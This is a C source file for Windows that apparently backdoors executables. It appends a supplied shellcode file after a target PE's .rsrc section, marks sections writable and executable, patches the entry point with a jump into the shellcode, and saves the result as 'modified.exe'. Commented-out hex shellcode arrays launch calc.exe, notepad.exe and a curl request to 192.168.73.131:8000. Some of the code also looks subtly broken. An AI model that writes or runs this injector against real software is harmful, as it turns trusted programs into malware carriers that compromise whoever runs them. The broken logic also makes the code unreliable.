#include<Windows.h>
#include<stdio.h>
#include<string.h>
#include<math.h>

//unsigned char calc[] =
//"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
//"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
//"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
//"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
//"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
//"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
//"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
//"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
//"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
//"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
//"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
//"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
//"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
//"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
//"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
//"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
//"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
//"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
//"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
//"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

//unsigned char calc[] =
//"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
//"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
//"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
//"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
//"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
//"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
//"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
//"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
//"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
//"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
//"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
//"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
//"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
//"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
//"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
//"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
//"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
//"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
//"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
//"\xd5\x63\x75\x72\x6c\x20\x31\x39\x32\x2e\x31\x36\x38\x2e"
//"\x37\x33\x2e\x31\x33\x31\x3a\x38\x30\x30\x30\x00";

unsigned char* calc=NULL;
DWORD shellcodesize = NULL;



//unsigned char calc[] =
//"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
//"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
//"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
//"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
//"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
//"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
//"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
//"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
//"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
//"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
//"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
//"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
//"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
//"\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

void SETRWX(PBYTE address, DWORD size)
{
	DWORD dwoldprotect = NULL;
	if (!VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, &dwoldprotect)) {
		printf("ERROR: %d\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

LPVOID ResizeSection(HANDLE hfile, LPVOID filedata, DWORD filesize)
{
	PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)filedata;
	PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)(dosheader->e_lfanew + (PBYTE)dosheader);
	PIMAGE_SECTION_HEADER sectionheader = IMAGE_FIRST_SECTION(ntheader);
	WORD numberofsections = ntheader->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER rsrcsection = NULL;
	for (int i = 0; i < numberofsections; i++) {
		printf("%s\n", sectionheader->Name);
		if (strcmp(sectionheader->Name, ".rsrc") == 0) {
			rsrcsection = sectionheader;
			printf("Section Header at address: 0x%p\tRVA:0x%0.8X\n", sectionheader->VirtualAddress + (PBYTE)dosheader, sectionheader->VirtualAddress);
		}
		sectionheader = (PBYTE)sectionheader + sizeof(IMAGE_SECTION_HEADER);
	}

	sectionheader = IMAGE_FIRST_SECTION(ntheader);
	//shellcodesize = sizeof(calc);
	printf("Shellcodesize: %d\n", shellcodesize);
	printf("New file size: %d\n", filesize + shellcodesize);
	LPVOID newfiledata = HeapAlloc(GetProcessHeap(), 0, filesize + shellcodesize);

	DWORD tillendrsrcsize = rsrcsection->PointerToRawData + rsrcsection->SizeOfRawData;
	printf("tillendrsrcsize: %d\n", tillendrsrcsize);
	memcpy(newfiledata, filedata, tillendrsrcsize);

	memcpy((PBYTE)newfiledata + tillendrsrcsize, calc, shellcodesize);

	SETRWX((PBYTE)((PBYTE)newfiledata + tillendrsrcsize), shellcodesize);

	PIMAGE_SECTION_HEADER copiedrsrc = ((PBYTE)newfiledata + rsrcsection->PointerToRawData);
	printf("Before datasize: %d\n", copiedrsrc->SizeOfRawData);
	copiedrsrc->SizeOfRawData += shellcodesize;
	printf("After datasize: %d\n", copiedrsrc->SizeOfRawData);

	PIMAGE_SECTION_HEADER currentsection = (PBYTE)rsrcsection +1;
	DWORD sectionOffset = rsrcsection->PointerToRawData + rsrcsection->SizeOfRawData + shellcodesize;
	
	for (int i = (rsrcsection - sectionheader) + 1; i < ntheader->FileHeader.NumberOfSections; i++)
	{
		//PIMAGE_SECTION_HEADER copiedsection = ((PBYTE)newfiledata + ((PBYTE)currentsection - (PBYTE)filedata));
		PIMAGE_SECTION_HEADER copiedsection = (PIMAGE_SECTION_HEADER)((PBYTE)newfiledata + shellcodesize + currentsection->PointerToRawData);
		//PIMAGE_SECTION_HEADER copiedsection = ((PBYTE)newfiledata + shellcodesize + currentsection->PointerToRawData);
		memcpy((PBYTE)newfiledata + shellcodesize + currentsection->PointerToRawData, (PBYTE)filedata + currentsection->PointerToRawData, currentsection->SizeOfRawData);
		
		copiedsection->VirtualAddress+=copiedsection->VirtualAddress+shellcodesize;
		copiedsection->PointerToRawData += shellcodesize;
		copiedsection->Characteristics = 0xE00000E0;
		currentsection = currentsection + sizeof(IMAGE_SECTION_HEADER);
	}

	PIMAGE_DOS_HEADER newdosheader = (PIMAGE_DOS_HEADER)newfiledata;
	PIMAGE_NT_HEADERS newntheader = (PIMAGE_NT_HEADERS)((PBYTE)newdosheader + newdosheader->e_lfanew);
	DWORD align16size = pow(2, shellcodesize / 32 + 1);
	printf("align16size: %d\n", align16size);
	//newntheader->OptionalHeader.AddressOfEntryPoint = rsrcsection->VirtualAddress+align16size;

	sectionheader = IMAGE_FIRST_SECTION(newntheader);
	DWORD entryPoint = newntheader->OptionalHeader.AddressOfEntryPoint;
	DWORD entryPointOffset = NULL;
	PIMAGE_SECTION_HEADER newrsrcsection = NULL;
	for (int i = 0; i < newntheader->FileHeader.NumberOfSections; i++) {
		if (entryPoint >= sectionheader->VirtualAddress && entryPoint < sectionheader->VirtualAddress + sectionheader->Misc.VirtualSize) {
			entryPointOffset = sectionheader->PointerToRawData + (entryPoint - sectionheader->VirtualAddress);
			break;
		}
		/*if (strcmp(sectionheader->Name, ".rsrc") == 0) {
			newrsrcsection = sectionheader;
		}*/
		sectionheader++;
	}

	DWORD   jumpAddressWithOffset = tillendrsrcsize;
	printf("JUMP ADDRESS (OFFSET): 0x%0.8X\n", jumpAddressWithOffset);

	/*unsigned char bytes[5];
	bytes[4] = (jumpAddressWithOffset & 0xFF000000) >> 24;
	bytes[3] = (jumpAddressWithOffset & 0x00FF0000) >> 16;
	bytes[2] = (jumpAddressWithOffset & 0x0000FF00) >> 8;
	bytes[1] = jumpAddressWithOffset& 0x000000FF;
	bytes[0] = 0xE9;*/

	DWORD alignRsrcPage = ((rsrcsection->SizeOfRawData / 4096 + 1) - ((float)(rsrcsection->SizeOfRawData)) / 4096) * 4096;
	DWORD shellcodeRVA = rsrcsection->VirtualAddress + rsrcsection->SizeOfRawData+alignRsrcPage;
	printf("alignRsrcPage: %d\n", alignRsrcPage);
	//DWORD shellcodeRVA = newrsrcsection->VirtualAddress + newrsrcsection->SizeOfRawData + align16size;
	DWORD entryPointRVA = newntheader->OptionalHeader.AddressOfEntryPoint;
	DWORD relativeOffset = shellcodeRVA - (entryPointRVA+5);

	unsigned char bytes[5];
	bytes[0] = 0xE9;  // JMP opcode
	*(DWORD*)(&bytes[1]) = relativeOffset;

	memcpy((PBYTE)newfiledata + entryPointOffset, bytes, sizeof(bytes));
	/*unsigned char bytes[] = { 0xE9, 0xFB, 0xED, 0x19, 0x00 };

	memcpy((PBYTE)newfiledata + entryPointOffset, bytes, sizeof(bytes));
	memcpy((PBYTE)newfiledata + entryPointOffset + sizeof(bytes), jumpAddressWithOffset, sizeof(jumpAddressWithOffset));*/
	
	PIMAGE_SECTION_HEADER newsectionheader = IMAGE_FIRST_SECTION(newntheader);

	for (int i = 0; i < newntheader->FileHeader.NumberOfSections; i++) {
		if (strcmp(newsectionheader->Name, ".reloc") == 0) {
			/*printf("YESSS");*/
			newsectionheader->Characteristics = 0xE00000E0;
			break;
		}
		//else printf("'%s\n", newsectionheader->Name);
		newsectionheader++;
	}

	SetFilePointer(hfile, 0, NULL, FILE_BEGIN);
	DWORD filebyteswritten = NULL;
	HANDLE newfile = CreateFileA("modified.exe", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(newfile, newfiledata, filesize + shellcodesize, &filebyteswritten, NULL);
	printf("Bytes written to new file: %d", filebyteswritten);
	SetEndOfFile(newfile);
	/*for (int i = numberofsections - 1; i >= 0; i--)
	{
		sectionheader->VirtualAddress += shellcodesize;
		sectionheader->PointerToRawData += shellcodesize;
		sectionheader->Misc.PhysicalAddress += shellcodesize;
	}*/
	return;
}

int main(int argc, char* argv[])
{
	if (argc < 2) {
		printf("Enter the name of the PE file you want to parse.\n");
		return -1;
	}

	char shellcodeName[MAX_PATH] = { 0 };
	strcpy_s(shellcodeName, MAX_PATH, argv[2]);

	FILE* file = fopen(shellcodeName, "rb");
	if (!file) {
		printf("error opening shellcode file");
		return -1;
	}

	fseek(file, 0, SEEK_END);

	long shellcodeFileSize = ftell(file);
	if (shellcodeFileSize == -1) {
		printf("error reading shellcode file size");
		return -1;
	}

	rewind(file);

	calc = (unsigned char*)malloc(shellcodeFileSize);
	if (calc == NULL) {
		printf("error allocating buffer");
		return -1;
	}

	DWORD bytes_read = fread(calc, 1, shellcodeFileSize, file);
	if (bytes_read != shellcodeFileSize) {
		printf("Error reading full file");
		return -1;
	}
	printf("BYTES READ SHELLCODE: %d\n", bytes_read);
	shellcodesize = bytes_read;

	char filename[MAX_PATH] = { 0 };
	strcpy_s(filename, MAX_PATH, argv[1]);
	printf("%s", filename);

	HANDLE hfile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Failed to open file: %d\n", GetLastError());
		return -1;
	}

	DWORD filesize = GetFileSize(hfile, NULL);
	LPVOID filedata = HeapAlloc(GetProcessHeap(), 0, filesize + sizeof(calc));
	DWORD dwsizeread = NULL;
	if (!ReadFile(hfile, filedata, filesize, &dwsizeread, NULL)) {
		printf("Failed to read file properly\n");
		return -1;
	}
	printf("\tFile Size: %d\tFile Present At: 0x%p\n\n", filesize, filedata);
	ResizeSection(hfile, filedata, filesize);

	return 0;
}